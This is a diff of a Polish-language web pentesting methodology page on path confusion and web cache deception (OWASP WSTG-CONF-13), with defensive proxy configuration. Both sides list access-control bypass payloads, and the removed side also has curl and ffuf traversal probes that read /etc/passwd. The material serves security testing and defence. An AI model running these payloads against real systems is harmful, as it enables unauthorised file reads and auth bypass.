@@ -1,136 +1,81 @@
 # WSTG-CONF-13 — Test Path Confusion
 
-## Cele
+## Cel
 
-- Make sure application paths are configured correctly
-- Test URL normalization and path traversal variants
-- Identify path confusion vulnerabilities that bypass security controls
+Wykrycie różnic w interpretacji ścieżek między reverse proxy a backendem (path normalization differences) oraz Web Cache Deception. Atakujący wykorzystuje różnice (`..;`, `%252e`, double-slash) do bypassu auth lub kradzieży cached authenticated content.
 
-## KOMENDY
+## Automatyzacja Nuclei
 
-### Testowanie path traversal
+### Nasz dedykowany szablon
 
 ```bash
-curl -s https://TARGET/..%2f..%2fetc/passwd | head -5
-curl -s https://TARGET/..;/admin | head -5
-curl -s https://TARGET/..%252f..%252f | head -5
-curl -s "https://TARGET/static/..;/admin" | head -5
-
+nuclei -l burp-export.xml -im burp \
+       -t templates/wstg-conf-13-path-confusion.yaml \
+       -proxy http://127.0.0.1:8080 \
+       -o results/wstg-conf-13.jsonl
 ```
 
-### URL normalization tests
+Szablon w 3 grupach: Cache Deception (`/me/x.css`, `/account/x.js` — authenticated content z static-like extension), Path normalization bypass (URL encoding, double-slash, backslash), Matrix params (`;jsessionid=`, `..;/`).
+
+### Dodatkowe oficjalne szablony Nuclei
 
 ```bash
-curl -sI https://TARGET/admin | head -1
-curl -sI https://TARGET//admin | head -1
-curl -sI https://TARGET/./admin | head -1
-curl -sI https://TARGET/admin/ | head -1
-curl -sI https://TARGET/admin/. | head -1
-curl -sI https://TARGET/ADMIN | head -1
-curl -sI https://TARGET/Admin | head -1
-curl -sI "https://TARGET/admin%20" | head -1
-curl -sI "https://TARGET/admin%00" | head -1
+# Path traversal misconfigurations
+nuclei -l burp-export.xml -im burp \
+       -t resources/nuclei-templates/http/misconfiguration/ -tags traversal,path
 
+# Cache poisoning / deception
+nuclei -l burp-export.xml -im burp \
+       -tags cache,deception
 ```
 
-### Path traversal z podwojnym kodowaniem
+### Suplementarne narzędzia
 
 ```bash
-curl -s "https://TARGET/%2e%2e/%2e%2e/etc/passwd" | head -5
-curl -s "https://TARGET/%252e%252e/%252e%252e/etc/passwd" | head -5
-curl -s "https://TARGET/..%c0%af..%c0%af/etc/passwd" | head -5
-curl -s "https://TARGET/..%ef%bc%8f..%ef%bc%8f/etc/passwd" | head -5
+# Param Miner (Burp ext) - zaawansowane cache poisoning detection
+# https://github.com/PortSwigger/param-miner
 
+# WebCacheVulnerabilityScanner
+go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner/cmd/wcvs@latest
+wcvs -u target.com
 ```
 
-### Bypass filtra sciezek
+## Coverage Matrix
 
-```bash
-curl -sI "https://TARGET/admin..;/" | head -1
-curl -sI "https://TARGET/admin;foo=bar" | head -1
-curl -sI "https://TARGET/admin%23" | head -1
-curl -sI "https://TARGET/admin%3f" | head -1
+| Wymiar | Pokryte | Nie pokryte |
+|---|---|---|
+| Cache Deception (static ext na dynamic content) | ✓ | — |
+| URL encoding bypass (%2e, %252e) | ✓ | — |
+| Double-slash, backslash | ✓ | — |
+| Matrix params (;jsessionid, ..;/) | ✓ | — |
+| Tomcat path bypass `/admin/..;/public/` | ✓ | — |
+| Cache key normalization differences | częściowe | wymaga multi-request differential |
+| HTTP/2 desync via path | — | osobno → INPV-16 |
+| Web Cache Poisoning (header-based) | — | Param Miner / WCVS |
 
-```
+## Standard pentesterski — jak to robi się wzorowo
 
-### Testowanie z roznym trailing
+### Metodologia (6 kroków)
 
-```bash
-curl -sI https://TARGET/admin | head -1
-curl -sI https://TARGET/admin/ | head -1
-curl -sI https://TARGET/admin// | head -1
-curl -sI https://TARGET/admin/./ | head -1
-curl -sI https://TARGET/admin/..;/ | head -1
+1. **Identify caching**: które responses mają `X-Cache: HIT`, `Age`, `Cache-Control: public`.
+2. **Cache Deception probe**: dla każdego authenticated endpoint (`/me`, `/account`, `/profile`) testować `<endpoint>/<canary>.css` — czy zwraca user content z `Content-Type: text/html`?
+3. **Cache verification**: jeśli sukces, sprawdzić z innego User-Agent czy cached version dostępna anonymously.
+4. **Path normalization bypass**: na każdym chronionym endpoint (auth-required) testować encoding warianty.
+5. **Tomcat-specific `..;/` bypass**: jeśli Tomcat backend, klasyczny `/admin/..;/public/`.
+6. **Reverse proxy + backend differential**: porównanie responses na dziwne paths z Cloudflare/Akamai vs direct backend (jeśli możliwe).
 
-```
+### Co MUSI być sprawdzone (10 punktów)
 
-### Reverse proxy path confusion
-
-```bash
-curl -sI "https://TARGET/public/..;/admin" | head -1
-curl -sI "https://TARGET/public/%2e%2e/admin" | head -1
-curl -sI "https://TARGET/api/..;/admin" | head -1
-
-```
-
-### Nuclei - path confusion/traversal
-
-```bash
-nuclei -u https://TARGET -tags lfi -o output_nuclei_lfi.txt
-nuclei -u https://TARGET -tags traversal -o output_nuclei_traversal.txt
-
-```
-
-## KOMENDY Z WORDLISTAMI
-
-### PayloadsAllTheThings - Directory Traversal payloads
-
-```bash
-ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/directory_traversal.txt" -mc 200 -o output_ffuf_traversal.json
-
-ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/deep_traversal.txt" -mc 200 -o output_ffuf_deep_traversal.json
-
-ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/dotdotpwn.txt" -mc 200 -o output_ffuf_dotdotpwn.json
-
-ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/traversals-8-deep-exotic-encoding.txt" -mc 200 -o output_ffuf_exotic_encoding.json
-
-```
-
-### Bug-Bounty-Wordlists 403 bypass payloads
-
-```bash
-ffuf -u "https://TARGET/adminFUZZ" -w Desktop/WSTG/Bug-Bounty-Wordlists-main/403_url_payloads.txt -mc 200 -o output_ffuf_403_bypass.json
-
-```
-
-### Bug-Bounty-Wordlists 403 header payloads
-
-```bash
-# Uzyj kazda linie jako naglowek do bypass
-ffuf -u https://TARGET/admin -H "FUZZ" -w Desktop/WSTG/Bug-Bounty-Wordlists-main/403_header_payloads.txt -mc 200 -o output_ffuf_403_header_bypass.json
-
-```
-
-### SecLists reverse proxy inconsistencies
-
-```bash
-ffuf -u "https://TARGET/FUZZ" -w Desktop/WSTG/SecLists-master/Discovery/Web-Content/reverse-proxy-inconsistencies.txt -mc 200 -o output_ffuf_reverse_proxy.json
-
-```
-
-## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
-
-1. Przetestuj rozne warianty sciezek w Burp Repeater (..;/, %2e%2e, podwojne kodowanie)
-2. Sprawdz roznice w zachowaniu frontendu i backendu (reverse proxy confusion)
-3. Testuj case sensitivity sciezek (Admin vs admin vs ADMIN)
-4. Sprawdz czy trailing slash zmienia zachowanie (/admin vs /admin/)
-5. Testuj null byte i inne specjalne znaki w sciezkach
-6. Sprawdz czy mozna ominac kontrole dostepu przez path manipulation
-7. Przetestuj path traversal do odczytu plikow systemowych
-8. Zweryfikuj czy normalizacja URL jest spójna miedzy komponentami
-
-
----
+- [ ] Cache Deception: `/me/<random>.css` zwraca dynamic content?
+- [ ] Cache Deception: `<endpoint>/<random>.{js,png,jpg,json,html}`
+- [ ] URL encoding bypass: `/admin/..%2f`, `%2e%2e/admin`
+- [ ] Double URL encoding: `%252e%252e/admin`
+- [ ] Double slash: `/admin//`, `//admin/`
+- [ ] Backslash: `/admin\..`, `\admin`
+- [ ] Self-reference: `/admin/./`
+- [ ] Tomcat matrix params: `/admin/..;/public/`
+- [ ] jsessionid matrix: `/admin;jsessionid=x`
+- [ ] Trailing dot/space: `/admin.`, `/admin%20`
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
@@ -138,38 +83,38 @@ ffuf -u "https://TARGET/FUZZ" -w Desktop/WSTG/SecLists-master/Discovery/Web-Cont
 
 ### Path confusion — mechanizm
 
-- Roznice w interpretacji sciezek miedzy **reverse proxy** (Nginx, Apache) a **backendem** (Tomcat, Node.js, Spring)
-- Proxy moze uznac sciezke za publiczna, a backend interpretuje ja jako dostep do chronionego zasobu
-- Kluczowe: normalizacja URL odbywa sie w roznych momentach na roznych komponentach
+- Różnice w interpretacji ścieżek między **reverse proxy** (Nginx, Apache) a **backendem** (Tomcat, Node.js, Spring)
+- Proxy może uznać ścieżkę za publiczną, a backend interpretuje ją jako dostęp do chronionego zasobu
+- Kluczowe: normalizacja URL odbywa się w różnych momentach na różnych komponentach
 
 ### Techniki path confusion
 
-| Technika | Przyklad | Cel |
+| Technika | Przykład | Cel |
 |----------|---------|-----|
-| Path traversal | `/public/../admin` | Ominiecie kontroli dostepu |
-| Semicolon (Tomcat/Jetty) | `/admin/..;/public` | Tomcat traktuje `;` jako separator parametrow sciezki |
-| Double URL encoding | `%252e%252e%252f` | Bypass WAF — dekodowanie odbywa sie dwukrotnie |
-| Null byte | `/admin%00.jpg` | Starsze serwery obcinaja po null byte |
+| Path traversal | `/public/../admin` | Ominięcie kontroli dostępu |
+| Semicolon (Tomcat/Jetty) | `/admin/..;/public` | Tomcat traktuje `;` jako separator parametrów ścieżki |
+| Double URL encoding | `%252e%252e%252f` | Bypass WAF — dekodowanie odbywa się dwukrotnie |
+| Null byte | `/admin%00.jpg` | Starsze serwery obcinają po null byte |
 | Backslash | `/admin\..\/public` | Windows IIS interpretuje `\` jak `/` |
-| UTF-8 overlong | `%c0%af` = `/` | Bypass filtrow ASCII |
+| UTF-8 overlong | `%c0%af` = `/` | Bypass filtrów ASCII |
 | Trailing dot/space | `/admin.` lub `/admin%20` | IIS ignoruje trailing dot/space |
-| Double slash | `//admin` | Niektore proxy pomijaja reguly dla podwojnego slasha |
+| Double slash | `//admin` | Niektóre proxy pomijają reguły dla podwójnego slasha |
 
-### Reverse proxy + backend — niespojnosci
+### Reverse proxy + backend — niespójności
 
 | Scenariusz | Proxy widzi | Backend widzi |
 |-----------|-------------|---------------|
 | `/public/..;/admin` | `/public/..;/admin` (publiczne) | `/admin` (chronione) |
 | `/admin/./` | `/admin/./` (block) | `/admin/` (normalizacja) |
 | `/Admin` | `/Admin` (nie matchuje regule `/admin`) | `/admin` (case insensitive) |
-| `//admin` | `//admin` (pomija regule) | `/admin` (normalizacja) |
+| `//admin` | `//admin` (pomija regułę) | `/admin` (normalizacja) |
 
-### Konfiguracja — jak zapobiegac
+### Konfiguracja — jak zapobiegać
 
 **Nginx + backend:**
 ```
-# Normalizuj sciezki PRZED przekazaniem do backendu
-merge_slashes on;  # domyslnie wlaczone
+# Normalizuj ścieżki PRZED przekazaniem do backendu
+merge_slashes on;  # domyślnie włączone
 # Blokuj path traversal
 location ~* /\.\./ { return 403; }
 # Blokuj semicolon
@@ -178,7 +123,7 @@ location ~* ; { return 403; }
 
 **Apache:**
 ```
-# Wlacz AllowEncodedSlashes Off (domyslnie)
+# Włącz AllowEncodedSlashes Off (domyślnie)
 AllowEncodedSlashes Off
 # mod_security: blokuj path traversal
 SecRule REQUEST_URI "\.\./" "id:1,deny,status:403"
@@ -186,57 +131,57 @@ SecRule REQUEST_URI "\.\./" "id:1,deny,status:403"
 
 ### Obrona
 
-- **Normalizuj sciezki** na proxy/WAF PRZED przekazaniem do backendu
-- Testuj te same reguly dostepu na proxy I backendzie — nie polegaj na jednej warstwie
-- Blokuj znaki specjalne w sciezkach: `..`, `;`, `%00`, `%2e`, `%2f` na wejsciu
-- Uzyj **allowlist** sciezek zamiast denylist
-- Upewnij sie ze proxy i backend uzywaja tego samego algorytmu normalizacji URL
-- Testuj case sensitivity — jesli proxy jest case-sensitive a backend nie, to vulnerability
+- **Normalizuj ścieżki** na proxy/WAF PRZED przekazaniem do backendu
+- Testuj te same reguły dostępu na proxy I backendzie — nie polegaj na jednej warstwie
+- Blokuj znaki specjalne w ścieżkach: `..`, `;`, `%00`, `%2e`, `%2f` na wejściu
+- Użyj **allowlist** ścieżek zamiast denylist
+- Upewnij się że proxy i backend używają tego samego algorytmu normalizacji URL
+- Testuj case sensitivity — jeśli proxy jest case-sensitive a backend nie, to vulnerability
 
-## ROZSZERZENIA BURP SUITE
+## Pentesterskie deep dive
+
+### Mniej znane techniki
+
+- **Web Cache Deception 2.0** (Omer Gil + community research): nowe warianty wykorzystują CDN URL normalization. CloudFront/Akamai mogą cache `/api/me/secret.css` jako static jeśli backend zwraca user content. Testować z różnymi extensions per CDN.
+- **Cache key vs Cache-Control mismatch**: `/api/me?cache=true` może być cached publicly nawet gdy `Cache-Control: private` (cache key includes query).
+- **Tomcat AJP bypass via `..;/`** (CVE-2020-1938 Ghostcat): related path bypass + AJP attack chain.
+- **Spring Security `;` bypass**: starsze wersje Spring Security ignorują matrix params w URL matching → `/admin/x;/public` może bypassować admin auth filter.
+- **Cache poisoning via Vary**: `Vary: User-Agent` + atakujący sets `User-Agent: <attack>` → cached version z atak content dla wszystkich users z tym samym UA.
+- **HTTP/2 path normalization differences**: HTTP/2 frontend → HTTP/1 backend conversion może zmienić path encoding.
+
+### Common pitfalls
+
+- **Cache deception wymaga dynamic content + cacheable**: jeśli Cache-Control: private/no-store, deception nie działa. Cross-check.
+- **Burp Cache Extension nie testuje wszystkich extensions**: `.css`, `.js` typowe; ale `.png`, `.json`, `.svg`, `.ico` też cached publicly w wielu CDN.
+- **Different per region**: ten sam target może mieć różne cache rules per CDN region — test multi-IP.
+
+### Świeżynki z research
+
+- **PortSwigger Web Cache Deception research**: https://portswigger.net/research/practical-web-cache-poisoning
+- **Web Cache Vulnerability Scanner**: https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
+- **Smashing the State Machine** (James Kettle): https://portswigger.net/research/smashing-the-state-machine
+- **HackTricks Cache Deception**: https://book.hacktricks.xyz/pentesting-web/cache-deception
+- **Spring Security path bypass research** (Orange Tsai): https://blog.orange.tw/
+
+## Rozszerzenia Burp Suite
 
 | Rozszerzenie | Opis | Link |
 |---|---|---|
-| Additional CORS Checks | Testowanie blednych konfiguracji CORS | [GitHub](https://github.com/ybieri/Additional_CORS_Checks) |
+| Param Miner | Cache poisoning + hidden parameter discovery | [GitHub](https://github.com/PortSwigger/param-miner) |
+| HTTP Request Smuggler | HTTP/2 desync, path confusion vectors | [GitHub](https://github.com/PortSwigger/http-request-smuggler) |
+| Hackvertor | URL encoding manipulation | [GitHub](https://github.com/PortSwigger/hackvertor) |
 
----
+## Źródła
 
-## Wskazówki ASVS
+- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion
+- PortSwigger Web Cache Poisoning: https://portswigger.net/research/practical-web-cache-poisoning
+- HackTricks Cache Deception: https://book.hacktricks.xyz/pentesting-web/cache-deception
+- Web Cache Vulnerability Scanner: https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
+- Orange Tsai research: https://blog.orange.tw/
 
-Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.
-
-### L1 (Podstawowy)
-
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V3.2.1 | Unintended Content Interpretation | Verify that security controls are in place to prevent browsers from rendering content or functionality in HTTP responses in an incorrect context (e.g., when an API, a user-uploaded file or other resource is requested directly). Possible controls could include: not serving the content unless HTTP request header fields (such as Sec-Fetch-\*) indicate it is the correct context, using the sandbox directive of the Content-Security-Policy header field or using the attachment disposition type in the Content-Disposition header field. |
-
-### L3 (Zaawansowany)
+### Wskazówki ASVS
 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
-| V14.2.5 | General Data Protection | Verify that caching mechanisms are configured to only cache responses which have the expected content type for that resource and do not contain sensitive, dynamic content. The web server should return a 404 or 302 response when a non-existent file is accessed rather than returning a different, valid file. This should prevent Web Cache Deception attacks. |
-
-
----
-
-## HackTricks Tips
-
-### Cache Deception
-
-- **Basic**: `www.target.com/profile.php/nonexistent.js` → cache przechowuje bo `.js`, content = profil usera
-- **Extensions**: `.css`, `.js`, `.png`, `.json`, `/../test.js`
-
-### URL Discrepancy Exploits
-
-- **Delimiter abuse**: `/profile;.css` (Spring strips `;.css`), `/profile.css` (Rails strips `.css`), `/profile%00.js` (OpenLiteSpeed truncates)
-- **Static dir + traversal**: `/home/..%2fstatic/something` — cache key = `/static/something`, origin serves `/home`
-- **Encoding**: cache uses `/myAccount%3Fparam`, origin decodes to `/myAccount?param`
-
-### Cache Poisoning
-
-- **Param Miner (Burp)**: brute-force unkeyed headers/params
-- **Unkeyed headers**: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`
-- **Fat GET**: GET z body parameter — backend uses body, cache key = URL only
-- **Parameter cloaking (Ruby/Rack)**: `;` separuje params: `?keyed_param=value;unkeyed=evil`
-- **Cache poisoning DoS**: oversized headers (400 cached), `X-HTTP-Method-Override: POST` na GET endpoint, unkeyed port `Host: target:1`
+| V13.1.1 | Generic Web Service (L1) | Same parsing logic for all endpoints. |
+| V13.1.5 | Generic Web Service (L2) | Strict input validation including path normalization. |
